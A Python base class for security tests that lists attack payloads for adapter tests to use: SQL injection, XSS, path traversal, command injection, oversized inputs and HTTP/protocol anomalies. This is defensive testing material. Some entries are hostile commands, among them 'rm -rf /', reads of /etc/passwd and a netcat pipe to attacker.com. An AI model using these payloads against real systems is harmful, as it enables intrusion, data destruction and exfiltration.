"""Base class for security-focused adapter tests."""


class SecurityTestBase:
    """Base class for security-focused adapter tests with predefined attack vectors.

    This class provides common attack payloads that can be used by adapter-specific
    security tests. Subclasses should implement their own test methods using these
    payloads, as each adapter type requires different testing approaches.
    """

    # SQL Injection payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT * FROM users--",
        "' OR '1'='1' --",
        "admin'--",
        "' OR 1=1--",
        "') OR ('1'='1",
    ]

    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
    ]

    # Path Traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "C:\\Windows\\System32",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]

    # Command Injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "`whoami`",
        "$(id)",
        "; cat /etc/passwd",
        "| nc attacker.com 1234",
    ]

    # Buffer Overflow payloads
    BUFFER_OVERFLOW_PAYLOADS = [
        "A" * 10000,
        "A" * 100000,
        "\x00" * 1000,
        "\xff" * 1000,
        "A" * 1000000,  # 1MB
    ]

    # Protocol anomalies
    PROTOCOL_ANOMALIES = [
        "\r\n\r\n",
        "\x00\x01\x02",
        "\xff\xfe\xfd",
        "\r\nHost: evil.com\r\n",
        "\x00",
        "\x0a\x0d",
    ]

    # HTTP-specific anomalies
    HTTP_ANOMALIES = [
        "GET / HTTP/1.0\r\n\r\n",
        "GET / HTTP/1.1\r\nHost: \r\n\r\n",
        "GET / HTTP/1.1\r\nContent-Length: -1\r\n\r\n",
        "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n",
    ]




